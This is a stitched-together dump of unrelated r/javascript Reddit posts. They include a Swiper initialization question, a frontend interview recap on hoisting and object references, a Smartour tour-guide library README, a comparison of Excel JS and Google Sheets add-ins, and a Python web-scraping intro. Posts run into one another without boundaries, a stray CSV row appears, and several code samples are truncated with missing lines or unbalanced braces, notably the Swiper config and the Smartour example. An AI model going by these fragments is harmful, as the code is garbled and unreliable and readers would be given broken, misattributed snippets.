        },
    
        // Navigation arrows
        navigation: {
          nextEl: '.swiper-button-next',
          prevEl: '.swiper-button-prev',
        },
    
        // And if we need scrollbar

          el: '.swiper-scrollbar',
        },
      })
      &lt;/script&gt;
    &lt;/body&gt;

However there is a folder in the github repository called ""playground"" with a file ""index.html"" where a new slider is iniatilized like this:

                slideToClickedSlide: true,
                grabCursor: true,
                scrollbar: {
                  el: '.swiper-scrollbar',
                },
                mousewheel: {
                  enabled: true,

            });
        &lt;/script&gt;

&amp;#x200B;

There is not a first parameter with the name ""'.swiper-container'"" instead a property called ""el"" is passed with the same value inside a single parameter that is an object. How this work? is this a feature of javascript? or an undocumented Swiper API feature?

1) What is Redux Saga? ( yeah that was first question lol)
- I said I don't know much but know about redux thunk so explained that

2) What new features did HTML 5 bring in? 
- I got blank! then he said have you heard of Semantic tags I was still blank, 

3) What is CSS Box Model?
- Explained the whole how a element has Content-&gt;Padding-&gt;Border-&gt;margin structure
then he asked giving an example with 

```
&lt;div&gt;A&lt;/div&gt;,
&lt;div&gt;B&lt;/div&gt;,
&lt;div&gt;C&lt;/div&gt; 
```
then why would B stick to left most part of the browser display, I explained that if we give it margin it will just move away from the left most part of the screen as well as the top and bottom div elements. 

but then the confusion was created that how can that happen?

4) what are the different values you can give to position?
- I could only recall absolute, relative

5) what are the different values one can give to display?
- I could recall none, in-line, block, flex

then he brought in that A, B, C example again saying what will happen to B if we have it position `relative` I explained that it might overlap to the previous and set itself according to A's position 

then question: what if we give in-line and in-line block what will happen, explained that in-line will put those elements in a row where as block will create a block that extend the whole width of that element.


Now coming to *javascript*
6) 

```
console.log(a, b, c, d);

var a = 10;
let b = 5;
function(c){return 15;};
var d = function(){return 20;};
```

I said a will output undefined, because of hoisting only variable declaration gets hoisted not the initialization,

b will throw some error (which I don't know) but let keyword doesn't hoist

c I was unsure

d I said same as a it will hoist that it is a function but not the execution and will just say undefined.

but he said no you are wrong for c and d, I couldn't explained and got blank

7) 

```
var a = {
   x: 'something',
   y: 'technology',
};

var b = a;
var c = b.y;
var d = c;
a.y='discussion';

console.log(a, b, c, d);
```

I said a will print out the object with updated value, 
b will print out object with old values
c will be 'technology' since the old values
and I was again unsure about d but said it will be same as c 

and the MAJOR LONG CONFUSION begins,

I explained that b will have a's initialized state values but not the complete copy it will be pointing to a. 
he asked, like why do we need such code design ? What made it evolve into something like this? and what benefit does it give us? 

I was blank again but tried to explain in a way saying that when we want the old prototypes to be hold by the assignment and only use them while the particular object might get mutated later on in the code/procedure, so this one helps to resolve those kind of code design. 

And he kept asking those questions for few minutes. 

8) what is local storage? 
what is session storage?
what are cookies?

I explained the local storage that browser holds one object which we can access by get and set. But said session storage depends on our backend and how we write then on his notice I corrected that it is client side.

then he asked can we delete/remove/destroy local-storage, or where does it get deleted? Noob, I said, it gets removed upon page refreshed?

but then the cookies came and I said that whenever webpage loads it also stores some values in terms of object in browser's storage which can later be manipulated by the webpage's interactivity? but then he kept asking what are cookies? 

and I got confused!!!

&amp;#x200B;

My current situation is that I am a frontend engineer, spending my day working in React.

&amp;#x200B;

Although I don't find that I often struggle in my role, the issue I am facing is that the majority of my day to day is not spent writing pure javascript, or tackling your pure javascript type CS problems. For example, I have never had to do something like flatten an array, or traverse a binary tree.

&amp;#x200B;

My concern is that, although I am gaining good frontend experience (with React, HTML, CSS, testing etc), my pure javascript ability is lagging and falling behind.

&amp;#x200B;

I understand that there is plethora of resources out there, however because there are so many I am finding it hard to know which ones are actually worth investing time into.

&amp;#x200B;

I was therefore wondering which sites or methods any of you have found best to build on your raw javascript skills?

&amp;#x200B;

I created a small little html/javascript thing I call the reddit contentinator. It can be used to monitor subreddits, search queries, user comments/profiles/posts in real time. It allows you to sort by various filters exposed by the API like sorting new, top, controversial, etc. You can change the sort order so new posts load on top (not sure if I labeled this correctly in the script). You can monitor subreddits for NSFW content or SFW content as marked by the reddit API. For example, the default state of the script is to monitor /r/all in SFW mode. You can click NSFW and get all the NSFW content your heart desires. Its really fun to sort by OC, reverse the sort order and view all the original content people create as it hits reddit.

&amp;#x200B;

Years ago, I made a similar script but wasn't as feature rich to help some subreddit moderators monitor for new posts as they came in. Recently, I decided to remake the script from scratch and slap in as many features as I could. I would love to hear if anyone has any ideas for more features. Its a fun, small script that you can just keep on your desktop and launch. I cant really think of anything else to add to this, and figure it might be worth sharing so people can use or contribute to it. Might be mostly useful for subreddit moderators. Visually the script is very simple, just some basic css styling with a sticky header so you always have access to the buttons and controls to change settings.

I'm primarily restricted to using javascript, and I've been searching very heavily for an existing library (js / node) that supports this functionality to no avail. 

Libraries I've been investigating / trying: 
[jspdf](https://github.com/MrRio/jsPDF), 
[pdf kit](http://pdfkit.org/), 
[pdf make](http://pdfmake.org/#/), 
[html-pdf](https://www.npmjs.com/package/html-pdf), 
[wkhtmltopdf](https://wkhtmltopdf.org/index.html)

The majority of these leverage an html interpretation to create pdf elements in the document, which seems to then disregard the html afterwards. One would think that there should be some support to see what html tags are on the page, and similarly add those tags to the document as well, but not having any luck. A couple of the libraries that support programmatic building of the elements, only seem to support the outright pdf elements like text boxes, tables, cells, etc. and don't seem to have any functionality for those accessibility tags. 

One that I did find that seemed to support it out of the box was [PDF Reactor](https://www.pdfreactor.com/product/samples/accessibility/accessibility.pdf). Naturally, this is a paid library, and there are issues for securing the funds to pay for that.

So... any help on this matter would be appreciated. I may be approaching this problem incorrectly or may be missing a bigger picture here.

I know how to code using VBA and everything is so simple there because the program will run line by line but I know this is not as simple when it comes to js. Yes, js will also run the code line by line but if you have functions within a function then you have to do callbacks or async/await or promises. Those concept makes my head hurt..a lot! So here's a simple code I made:

	//changes the source of an image
	function changeEye(num){
		var fName = ""eyes/"" + num + "".png"";
		document.getElementById(""eye"").src=fName;
	};

	function randTime(){
		var x = Math.floor((Math.random() * 3) + 1) * 1000;
	  	return x;
	};

	function seq1(){
		setTimeout(changeEye, randTime, 1);
		setTimeout(changeEye, randTime, 2);
		setTimeout(changeEye, randTime, 3);
		setTimeout(changeEye, randTime, 4);
		setTimeout(changeEye, randTime, 5);
	}

The idea for the seq1 function is to sequentially change the displayed image after a random amount of time. I know the code below will not work because all the setTimeout functions will execute all at the same time (actually, I'm not sure too). How can I correct the seq1 function so that the 5th setTimeout function will only execute after the 4th, 3rd, 2nd and 1st? What will be the best way of writing this if I have 30 functions inside the seq1 function that I want to run synchronously? I have watched and read numerous tutorials online but I just can't get my small brain to understand it. Any help from you Pros is greatly appreciated.

I like Flask, it's my first web framework I learned and used. I made lot's of google queries on how to convert a Flask app to a desktop and none of them fulfilled my needs (pywebview was close but javascript code didn't executed corectly in some cases, uses IE but you can change it to CEF, still to hacky to me)

Now I use [**flaskwebgui**](https://github.com/ClimenteA/flaskwebgui) to convert the Flask webapp to a desktop application:

You need just **3 lines** of code to do that:

    from flask import Flask   
    from flaskwebgui import FlaskUI #get the FlaskUI class        LINE-1
    
    app = Flask(__name__) 
    
    ui = FlaskUI(app) # Feed it the flask app instance            LINE-2  
    
    # Flasky logic

What if we just send python with the .py files to others? What could go wrong? They can see the source code and use python for other stuff? Maybe, so?

2929,2019-06-13 16:16:09,2,2,"Hey, r/javascript! We are researchers interested in supporting developers working with Continuous Integration (CI). We post here because many of you are using a build tool (e.g., Maven, Gradle) and a CI server (e.g., Jenkins, Gitlab).

While the adoption of CI has undisputed benefits (e.g., faster and more reliable releases), mastering CI is all but simple. CI has principles (e.g., merge their branches to master daily) that are often very hard to follow in practice. Thus, some anti-patterns (i.e., deviation from CI principles) emerge.

To make developers aware of these anti-patterns, we built a catalog of CI anti-patterns and we would like to receive your opinion on it through a [survey](https://surveyhero.com/c/22a78256).

Our catalog includes 7 sections, concerning different categories of anti-patterns (in turn each category may be divided into sub-categories). When browsing the survey, you can skim some categories and focus only on the anti-patterns that you are more interested in rating. Thus, the time required to complete the survey strongly depends on your interests.

We hope that many of you share your expertise with us!",Continuous Integration: Are we doing it (correctly)?

Hi :D

A year ago I made [this post](https://www.reddit.com/r/javascript/comments/8pvpva/ive_created_a_small_modern_colorpicker_with/) where I showed my project to create a new, modern color picker without any dependencies. It's incredible how much it evolved thanks to all these great contributors - and I'm still working on to improve, simplify and enhance all of it's features as good as I can!

&amp;#x200B;

For now these are the currently available, main features:

1. Absolute zero dependencies / Material design
2. Ultra small: \~6kB [brotlied](https://github.com/google/brotli) / \~7kB GZip
3. Mini but flexible, independent positioning engine
4. 3 (currently available, more are planned) Themes (Any proposals are heavily welcome :D)
5. Fine-tuning via mouse-wheel (like in the dev console)
6. Five color modes: HEX, RGBA, HSVA, HSLA and CMYK
7. Responsive / full mobile support
8. Color swatches for quick-selection
9. Fully configurable components
10. Shadow-DOM support
11. ... And many more

&amp;#x200B;

Unfortunately there also still problems with nested, scrollable containers (almost every widget seems to have these but hey, that's for sure not an excuse). Moreover I sadly don't have enough time to make it test-driven since there are many, many edge cases on all browsers which would need to be covered. Moreover I cannot really test it on iOS devices, if someone encounters any problems please raise an [issue](https://github.com/Simonwep/pickr/issues/new). I'll do my best to fix it.

Hi, everyone, I am pretty new about how to set up a forum and I only have some basic knowledge about javascript.

I am a research student at a university. For my project, we need to set up a platform, that is a forum with a customized chatbot to do our experiment. And the website should be a private one, that is only the invited users can visit it. But I have no idea how to set up a forum that is similary to the reddit.

I can come up with 3 solutions to solve this problem:

1. Create a subreddit. Subreddit has many options, and the private mode seems can satisfy my need for a controllable forum. But I cannot do that with my account because I just registered for a week, and we cannot add a chatbot in the subreddit. It is an import feature for our project.
2. Using the template from WordPress or some other websites. From some tuotirials, I can see there are some default templates, including forus templates. But I have no idea how to add a chatbot service in that website. Even if I can see some chatbots in some forums, they are all powered by some third party company, which is also not what we want. And it seems that anyone can visit these forums use google email/facebook/twitter to log in, but I hope I can control who can come, that is the website should be a private one.
3. Create from a scratch. I think there maybe some good tutorials that can guide me how to do it, but it may take a long time for me to do the front-end and back-end work. I found some open source project in Github, but I have no idea how to modify it, like adding some buttons to add my new features, the chatbot.

So now I prefer the second solution but do not know whether it is possible to add a customized chatbot service...

That sounded great to me, but it also confused me, how come people don't talk about this often and only refer to javascript as a web scripting language? Why aren't more people advertising learning javascript to beginners, especially those who don't want the hassle of learning another language (i.e. swift) to, for example, release their Android app on iOS? 



Javascript sounds like a dream-come-true language for a programming novice like me considering how much platform-agnostic it seems through open-source software frameworks like Electron and React Native, more so than any other language(?).

Due to my career having unexpected turns, I have lost contact with web development, and I would like to get back to it and learn modern techniques. I have a simple and motivating project to do for friends.

On the other hand, I'm lost: Where to start? How do I structure my application? How to generate HTML (template engine, or via Kotlin DSL?) Which javascript framework to choose (angular, react) ? Or is it possible to use Kotlin also on the browser side instead of JS ? Which framework on the server side, etc.

Thank you in advance for any information indicating a vague structure to follow, tutorials or any example application.",Web application development refresh using Kotlin

I've been working in the blockchain world for quite some time. About four years ago I created an open-source development tool for blockchain applications, written 100% in Javascript (in fact it started in CoffeeScript - ouch!). This tool has grown into a suite of Javascript-based tools -- including a command line, desktop app, and libraries -- and I wanted to introduce it to the broader Javascript community.

The main tool is called Truffle: [https://www.trufflesuite.com/](https://www.trufflesuite.com/) \- [Github](https://github.com/trufflesuite)

Our goal with the tool, and with the branding, is to create a development experience synonymous with eating a chocolate Truffle. I've found that excellence in tooling is often overlooked, and developers typically have to slog through technicalities to focus building on their application. We're trying to change that, at least for the blockchain world.

What I'd love from this community is some feedback. We've done a great job being a member of our own blockchain communities (e.g., /r/ethereum), but I wanted to see if there was some love for blockchain from the wider Javascript development audience. Are you looking for more javascript-based blockchain content? For instance, we could show off our free and open source [Solidity debugger](https://github.com/trufflesuite/truffle/tree/develop/packages/truffle-debugger), written 100% in Javascript (deep dive [here](https://ethdebug.github.io/solidity-data-representation/)). Or there's [Ganache](https://www.trufflesuite.com/ganache), our blockchain-in-electron app meant to expose what's going on under the hood.

Anyway, would love your thoughts, and wanted to show off our free, open source tools to a new community.

I am Nick AKA NameRandom and I made a thing. I'd like to share said thing with you!  


i have no idea if it'll be of any use to any of you, or if all of you think that its utter dogshit.  


That being said I call it ReactPlus, it is in essence a bastard child of ExtJS and React, where React is the mom and Ext is the dad that left for smokes one day and never came back.  


Why did I make this? Because i just feel more comfy with ExtJS than i do with react and this is a sorta kinda merger of the two.   


Written by me, released under MIT for all open source software and commercial applications are forbidden at the moment (basically you cant use my code in your commercial app/company or whatever, free to use for whatever else)  


What it does?  


Esentially it makes a Base class and all other classes should extend that base class ( omg its not hooks, yeye i know, i dont care, not a fan of hooks)  


It also lets you pack stuff like you would do in ExtJS, that is in my honest opinion a better way to do it than it is in React and far superior to anything else I have thus far enocountered (barring Angulars dependency injection/class injection, may possibly come at some point in the future if i am bored enough)  


That being said. Take a look at it, test it, tell me what you think, feature requests are ofc open and any NORMAL criticism will be happily accepted  (by normal i mean - tell me what is bad and why do you think its bad and how it can be made better, preferably in that order, either here or on github)

Once a website has changed its UI, usually they would set a list of tour guide to tell the visitors, that some modules were moved to the other places. We named it as ""tour guide"", and **Smartour** is a solution for making tour guide much easier.

&gt; Github: https://github.com/jrainlau/smartour
&gt;
&gt; Official demo: https://jrainlau.github.io/smartour

## Usage
**Smartour** were built as an `umd` package, which means you can import it in many ways.

```
npm install smartour
```

```javascript
/* ES Modules */
import Smartour from 'smartour'
/* CommandJS */
const Smartour = require('smartour')
/* &lt;script&gt; */
&lt;script src=""smartour/dist/index.js""&gt;&lt;/script&gt;
```

```javascript
const tour = new Smartour().queue([{
  el: '#id',
  slot: `
    &lt;p&gt;Something you want to guide to the visitors&lt;/p&gt;
  `
}])

tour.next()
```

## Options
The `Smartour()` is a class who recives an `options` parameter.

```javascript
{
  // `maskStyle` is the stylesheet of the mask.
  // default value will be concated with the new defined.
  markStyle: `
    position: fixed;
    box-shadow: 0 0 0 9999px rgba(0, 0, 0, .5);
    z-index: 9998;
  `, // default

  // `slotStyle` is the stylesheet of the slot content.
  // default value will be concated with the new defined.
  slotStyle: `
    position: fixed;
    z-index: 9999;
  }` // default

  // `maskPadding` sets the padding within the highligt area
  maskPadding: { vertical: 5, horizontal: 5 }, // default

  // `slotPosition` sets the position of the slot content
  // 'top', 'top-right', 'top-left', 'bottom', 'bottom-right', 'bottom-left' are allowd.
  slotPosition: 'bottom', // default

  // `maskEventType` event type of the trigger event binding to the mask
  // 'click', 'mouseon', 'mouseover', 'mousedown', 'mousemove', 'mouseup', 'touchstart', 'touchmove', 'touchend' are allowd
  maskEventType: 'click', //default

  // `maskEvent` is the event binding to the mask
  maskEvent: () =&gt; {} // default
```

## APIs
- `queue(TourList)`
  
  `.queue()` recieves a `TourList` parameter, which is a list contains one or more `TourListItem`.

  ```javascript
  [{
    // `el` is the selector of the highlight element
    el: '#id-1',

    // `slot` is a html string of the guide content
    slot: `
      &lt;p&gt;This is a demo...&lt;p&gt;
      &lt;button class=""key-1""&gt;Cancel&lt;/button&gt;
      &lt;button class=""key-2""&gt;OK&lt;/button&gt;
    `,

    // `keyNodes` defines the binding relationship between events and slot
    keyNodes: [{
      el: '.key-1',
      eventType: 'click',
      event: (e) =&gt; {
        alert('Click ""Cancel"" button')
      }
    }, {
      el: '.key-2',
      eventType: 'mouseover',
      event: (e) =&gt; {
        alert('Hover ""OK"" button')
      }
    }]
  }]
  ```

- `next()`

  `.next()` is a function to show the next tour guide, and returns a `Promise` which contains the `Smartour` instance.

  ```javascript
  const tour = new Smartour().queue(TourList)

  await tour.next() // shows the first tour guide
  await sleep(2000) // 2s timeout
  await tour.next() // shows the second tour guide
  ```

- `prev()`

  `.prev()` is a function to show the prev tour guide, and returns a `Promise` which contains the `Smartour` instance.

  ```javascript
  const tour = new Smartour().queue(TourList)

  await tour.next() // shows the first tour guide
  await sleep(2000) // 2s timeout
  await tour.next() // shows the second tour guide
  await sleep(2000) // 2s timeout
  await tour.prev() // shows the first tour guide again
  ```

- `over(smartourInstance)`

  `.over(smartourInstance)` is a function to remove all the guides.

  ```javascript
  const tour = new Smartour().queue(TourList)

  await tour.next() // shows the first tour guide
  await sleep(2000) // 2s timeout

  tour.over(tour) // all the guides were removed
  ```

- `reset(options)`

  Set a new `options` to the `Smartour` instance.

  ```javascript
  const tour = new Smartour().queue(TourList)

  await tour.next() // shows the first tour guide
  await sleep(2000) // 2s timeout

  tour.reset({
    maskStyle: `
      border-radius: 5px;
    `
  })
  tour.next()
  ```

## Example
We use the [official demo](https://jrainlau.github.io/smartour/) usage as an example.

```html
&lt;body&gt;
  &lt;main&gt;
    &lt;h1 class=""title""&gt;Smartour&lt;/h1&gt;
    &lt;h3 class=""desc""&gt;Makes website guiding easier&lt;/h3&gt;
    &lt;a class=""link"" href=""https://github.com/jrainlau/smartour/blob/master/README.md#smartour""&gt;Document&lt;/a&gt;
  &lt;/main&gt;
&lt;/body&gt;
```

```javascript
const tour = new Smartour({
  slotPosition: 'top',
  maskStyle: `border-radius: 4px;`
}).queue([{
  el: '.title',
  slot: `
    &lt;div class=""guide guide-1""&gt;

  keyNodes: [{

      tour.reset({
        slotPosition: 'bottom-right',
        maskStyle: `border-radius: 4px;`
      })
      tour.next()
    }
  }]
}, {
  el: '.desc',
  slot: `
    &lt;div class=""guide guide-2""&gt;
      &lt;p&gt;This is what my job is!&lt;/p&gt;
      &lt;button class=""btn btn-2""&gt;Yeah.&lt;/button&gt;
    &lt;/div&gt;
  `,
  keyNodes: [{
    el: '.btn-2',
    event () {
      tour.reset({
        slotPosition: 'bottom',
        maskStyle: `border-radius: 4px;`
      })
      tour.next()

}, {

### What

We're piloting a new ruleset where self-posts (text) will only be accepted if they're prefixed with ""[AskJS]"". You can read more about the details on the [\[AskJS\] wiki page](https://www.reddit.com/r/javascript/wiki/index/askjs).

We have tentatively landed on using the `[AskJS]` prefix, in keeping with the spirit and tradition of ""AskReddit"", ""AskHistorians"", etc. **However, the goal is to foster discussion**, not just field survey responses. If `[AskJS]` isn't clear enough, or doesn't seem to remain true to the ""Ask"" paradigm, then we change it to `[DiscussJS]`, but would rather not for brevity and consistency with the rest of reddit.

### Why?

For perspective: in the month of June, I personally removed 472 posts, of which at least 90% were help posts. This is an order of magnitude more than just a year ago, and it's growing at an untenable rate. Basically, this rule change in response to the arrival of our very own [Eternal September](https://en.wikipedia.org/wiki/Eternal_September), where we're being inundated with help posts which were long ago [deemed unwelcome](https://www.reddit.com/r/javascript/comments/6waspe/do_we_need_a_javascripthelp_subreddit/). 

A [recent suggestion](https://www.reddit.com/r/javascript/comments/bntr71/two_ideas_for_rjavascript_and_rlearnjavascript/) highlighted some of the problems with our current approach, and thus the idea was born: instead of a _""default  allow all, remove violators""_ approach, we're moving to a _""default deny all, allow opt-in""_ approach.

Again, this is only for self-posts; link posts will be unaffected.

### Also...

Another facet of this change, that I'm pretty excited about, is the relaxing of the rules for what's considered ""off-topic""; with `[AskJS]`, we expect the topics to still be in regards to JS, but we want to allow you more freedom to discuss related matters (not precisely ""just javascript"") with your peers. 

**Important:** with the relaxing of these rules, we're going to rely on you a lot more to determine the fitness of a topic through voting -- so please upvote/downvote `[AskJS]` posts with prejudice! And as always, posts that float the rules (namely, help posts) should outright be reported.

I've played around with javascript a bit in the past, but I forget a lot of the terminology, apologies - I would totally search this on my own if I could remember any of what it was called!

I know that it's possible to go into a webpage's settings and tweak things so that a webpage displays differently for oneself. Like give Google a black background, for example.

I am hoping to do this with a website that I use for work. For some reason, they decided it would be a good idea to have a drop down list of every individual number between 0 and 60. I have to fill out tons of these boxes with various numbers, but it doesn't accept typing.

It's difficult for me to convey just how much this page annoys me.

&amp;#x200B;

I'm up to a challenge of creating something like a Venn Diagram where I need to always guarantee that the interception of the 3 circles is always exactly at the center of the canvas. I'm having hard time trying to get to the formula, (some suggested trigonometry) but as I am a novice at javascript and math isn't my strong I was hoping someone was familiar with this. I found that anycharts helps with this but I would really like to avoid using libs. Any ttips?

JavaScript is growing fast, it’s becoming more native, but most importantly — it’s becoming more stable. The number of web development frameworks that have come into the JavaScript sphere in the last years has really boomed. Many of the frameworks have already established huge communities around them, Angular, Meteor and React to name a few. In today’s post, we will be taking a closer look at the currently most popular JavaScript frameworks. We strongly believe that these frameworks will be seeing a lot of growth, engagement, and exposure. Please share with us your personal experiences with the frameworks that you have used from our list as we would love to hear more input about the use cases for each individual framework.

When it comes to Web Development, JavaScript frameworks are one of the most favored platforms for developers &amp; businesses in today’s time. Possibly, you have had a chance to experiment with one or two of the popular JavaScript Frameworks too. However, somewhere in your mind,  you are still a little unsure about the best one to devote yourself to mastering or suggest your developer to opt for your next web development project.

This is quite obvious. JavaScript is moving at a breakneck pace and there is constant pressure to add new skills to your repository. In order to do that, knowing and understanding more of the top JavaScript  Frameworks in today’s time is necessary. After thorough voting by 300+  developers at [Simpliv](https://www.simpliv.com/), we shortlisted a few of them and here they are:

# 10 Popular JavaScript Frameworks for 2019

1. [Angular](https://angular.io/)

One of the most powerful, efficient, and open-source JavaScript frameworks is Angular. This framework is operated by the Google and is basically implemented to use for developing Single Page Application  (SPA). It extends the HTML into the application and interprets the attributes in order to perform data binding.

### 2. [React](https://reactjs.org/)

Created by Facebook, React framework has earned popularity within a  short period of time. In fact, it is used to develop and operate the dynamic User Interface of the web pages with high incoming traffic. It makes the use of a virtual DOM and hence, the integration of the same with any application is easier.

I’m currently developing a small add-in to Excel using Javascript (JS). While this project is tiny, only about 1,000 lines of code, it is the precursor to a huge application that will be completed by a small team over a couple of years. We’ve developed for Excel before using VBA, VSTO, and even XLLs. For various reasons, they will not work for our needs.

During this initial project there have been many issues that were unexpected. We are now questioning whether or not Google Sheets might be a better platform. I’m seeking input from the community of both Excel – JS and Google Sheets with regard to these issues. My intent here isn’t to bash either platform, simply to understand the pros and cons of each platform.

**Excel – Javascript Pros**

1. Office has many more users than Docs. According to [https://www.windowscentral.com/there-are-now-12-billion-office-users-60-million-office-365-commercial-customers](https://www.windowscentral.com/there-are-now-12-billion-office-users-60-million-office-365-commercial-customers) there are 1.2 billion Office users. According to [https://www.petri.com/office-365-soars-155-million-active-users](https://www.petri.com/office-365-soars-155-million-active-users) there are 155 million Office 365 subscribers and accelerating. According to [https://9to5google.com/2019/02/04/g-suite-5-million-businesses/](https://9to5google.com/2019/02/04/g-suite-5-million-businesses/) there are only 5 million paid Google Docs subscribers.
2. Excel JS has a great book written by Michael Zlatkovsky which I’ve read and does a great job of getting things started. Michael, if you’re reading this, on page 139, section 7.3 Loading collections, you have “see Loading collections for more details”. I got stuck in a small infinite loop for a moment. Despite this exceptionally minor issue, great book, easy read, great style. Should be considered mandatory reading for anyone starting with Office-JS.
3. Microsoft has done a great job with Typescript (TS) which (in my opinion) is a vast improvement over javascript. Office JS should really be Office TS as TS is the clear winner.

**Excel – Javascript Cons.**

I’m concerned with Microsoft’s commitment to the JS programming model. Reasons…

1. The latest and greatest version of Visual Studio (version 2019) lost the Javascript console in VS 2017. [https://developercommunity.visualstudio.com/idea/514147/bring-back-the-javascript-console.html](https://developercommunity.visualstudio.com/idea/514147/bring-back-the-javascript-console.html). I’m interpreting this as Javascript didn’t make the importance threshold for launch of their latest IDE.
2. Javascript is much more limited than Visual Basic for Applications (VBA) as the entire Excel object model can’t be automated. Instead “requirement sets” are being rolled out slowly. [https://docs.microsoft.com/en-us/office/dev/add-ins/reference/requirement-sets/excel-api-requirement-sets](https://docs.microsoft.com/en-us/office/dev/add-ins/reference/requirement-sets/excel-api-requirement-sets). More on this later.
3. The documentation for Office Manifest is nearly non-existent. Microsoft sent me to this page [https://docs.microsoft.com/en-us/office/dev/add-ins/develop/manifest-element-ordering](https://docs.microsoft.com/en-us/office/dev/add-ins/develop/manifest-element-ordering) which can be summed up as “read the schemas”. The use of plural (schemas) is intentional as there are several and it isn’t clear which one should be used. The directions explicitly state “If you don’t know which file \[schema\] has the definition, you may have to do step 3 on multiple files until you find it”. Step 3 is to “Search for . So in summary, search through the schemas until you find what you need.

In the two weeks that I’ve been programming with Excel -JS, I’ve run into several problems.

1. Microsoft provides three ways to check the aforementioned manifest. My manifest passes two of the methods yet when I try to upload it to Excel Web (called sideloading), it fails the manifest check. I get no guidance other than “Your Add-In Manifest is not valid”. More information [Manifest file passes Visual Studio test but fails when side loading to Office Web](https://stackoverflow.com/questions/57136595/manifest-file-passes-visual-studio-test-but-fails-when-side-loading-to-office-we)
2. There is a third method to check the manifest (just an XML file). They provide a schema which defines what is required and in what order (XSD) file. Yet, I can’t run this test since the XSD file they provide isn’t valid. For example, if you download TaskPaneAppVersionOverridesV1\_0.xsd from [https://github.com/OfficeDev/office-js-docs-pr/tree/master/docs/overview/schemas/taskpane](https://github.com/OfficeDev/office-js-docs-pr/tree/master/docs/overview/schemas/taskpane)and put it into [http://www.utilities-online.info/xsdvalidation/](http://www.utilities-online.info/xsdvalidation/) or xllint it fails both. At this point I am “full stop”. I see no path to resolution as the manifest checkers tell me it is fine and the XSD file isn’t valid. I can’t check an XML against the XSD if the XSD isn’t valid. Luckily I haven’t launch this yet. However, if I was trying to roll out a fix and my user base was breathing down my neck, I don’t know what I would do. This is honestly my biggest issue with Excel-js.
3. I’ve found what I think to be two simple bugs. I’ve documented them here [showHeaders=false results in unexpected Table Range using Javascript](https://stackoverflow.com/questions/57169164/showheaders-false-results-in-unexpected-table-range-using-javascript) and here [setSolidColor throwing unexpected error in Excel Javascript on chart series](https://stackoverflow.com/questions/57172497/setsolidcolor-throwing-unexpected-error-in-excel-javascript-on-chart-series). To be fair to Microsoft, I’m using Excel 1902 Build 11328.20116 which is somewhere between Beta and released.

Microsoft “forces” compatibility with Windows, Mac, and Web.

1. My first submission was rejected as it wouldn’t work for Mac or Excel Web. Our userbase doesn’t care about either of those platforms. But to my knowledge, there isn’t an option to opt out. Turns out the Mac rejection was due to one of the aforementioned bugs and the manifest problem is causing the Excel Web rejection.
2. Since Excel Web will run on many browsers, I am forced into more testing which I don’t really care about.

Complexity of running a Javascript on a desktop client. Michael’s previously mentioned book does a great job of clarifying this. Every interaction with the Excel Object requires asynchronous calls. To be fair it isn’t that big of a deal, but when I’m debugging, I have the constant nagging question of “does that code require syncing first”.

Requirement Sets are a pain. The previously mentioned requirement sets (see [https://docs.microsoft.com/en-us/office/dev/add-ins/reference/requirement-sets/excel-api-requirement-sets](https://docs.microsoft.com/en-us/office/dev/add-ins/reference/requirement-sets/excel-api-requirement-sets)) pair an Excel build with the set of instructions that it can support.

1. This forces the developer to look at every single call to the Excel object, look up which requirement set it uses, and document that in the code. This is time consuming. It would be awesome if Microsoft would put a “checker” in Visual Studio which would come back with a report, but for now it is manual.
2. It isn’t clear how many users are using each build of Excel. The first requirement set, version 1.1, works with Excel 1509. Are there still 50 million users of build 1509 or about 11? I don’t have any idea. When I’m deciding to use a function that requires 1.2 or later, how many people am I alienating?
3. It isn’t clear if Excel 2016 users can even get to the later builds. For example, API version 1.9 requires Excel version 1903. Is that now Office 2019 or can Office 2016 users still upgrade to that build? I know that Office 365 users will eventually get it, but what about the other billion users who aren’t on the subscription plan of Office 365?

Lack of a community. I posted several issues to StackExchange and thus far one person has made comments (thank you Ragavan). Looking around StackExchange the Office-js is a ghost town. I expect to see tumble weeds rolling by any moment.

Lack of Microsoft input on StackExchange. Thus far, none of my issues have been commented on or answered by Microsoft people on StackExchange (again the commitment to Office JS). Again to be fair, last week was the Inspire conference in Vegas; perhaps they are busy “catching up” after the conference. Also, If I post on docs.microsoft.com they do answer, but that seems like an odd way to go about it.

Lack of apps. Today I went to the Office Store from Excel. I found around 400-500 total applications. Office JS has been around since Office 2013. Why are there so few apps?

**Google Sheets Pros**

1. I’m guessing that since everything runs on a server (no desktop client) then the complexity of every call to sheets being asynchronous will not be required.
2. A lot more apps than Office. I didn’t attempt to count the number of apps in Google Sheets but it appears to be many more.

**Google Sheet Cons**

1. As previously mentioned, orders of magnitude fewer users.
2. Google Sheets isn’t the powerhouse Excel is. Excel has PowerQuery (unfortunately renamed Get and Transform) which is a game changer for our clients.
3. Our client base prefers standalone applications to web based ones.
4. No Typescript.

We need to make a decision. While most of our user base has Excel, we’ve queried them and most of them are willing to adopt Google Sheets due to the low price point.

Since I’m new to this, I am asking both communities for input. Have I missed any other considerations? Specifically, are there more Pros and Cons to Google Sheets that aren’t listed. Also, if I’ve made mistakes or I don’t represent something fairly or correctly, please let me know. I’ve clearly listed more cons for Excel than Docs, but that may be due to the fact that I have two weeks working with Office JS and zero time with Docs.

Finally, my goal is to open the conversation about the entire development experience between Office and Docs, not to start a debate as to which is the better platform.

This text is from the blog I wrote recently at  [https://www.supars.com/web-scraping-with-python-a-comprehensive-tutorial/](https://www.supars.com/web-scraping-with-python-a-comprehensive-tutorial/) 

You can head over the above link if you prefer it that way. 

The idea for this blog was suggested by the students of my free video course  [https://www.supars.com/python-free-youtube](https://www.supars.com/python-free-youtube)

# Getting Started

You can start scraping in only five lines of code:

    import requests
    from bs4 import BeautifulSoup
    res = requests.get(""https://en.wikipedia.org/wiki/Python_(programming_language)"")
    bs = BeautifulSoup(res.text, 'lxml')
    print(bs.find(""p"", class_=None).text)

#  What is Web Scraping and Where is it Used?

Very simply put, you write a program, that extracts information from a web page, and makes it available for you in a format that you want —CSV file, word, database, etc.

Here are some examples where it is used:

* **Price Monitoring** – This is my favorite use case. It basically means monitoring prices of a product that you want to buy. You can create a log file, get email alerts and more.[In fact, I have created a course on this topic. Don’t miss to check it out.](https://supars.com/python-free-youtube)
* **Contact Information** – Used to collect email addresses, phone numbers, etc for lead generation for sales teams.

## Basic Code Structure

The main building blocks for any web scraping project is like this:

    Get HTML (Local or remote)
    Create BeutifulSoup object
    Parse required element
    Save the text inside the element for later use

The most important library here is `BeautifulSoup4`. It makes it easy to navigate the HTML document and find the content we need.

It takes two parameters: The HTML text, and a string denoting the parser to be used.

There are multiple options available when it comes to the parser, but `lxml` is perhaps the most popular one.
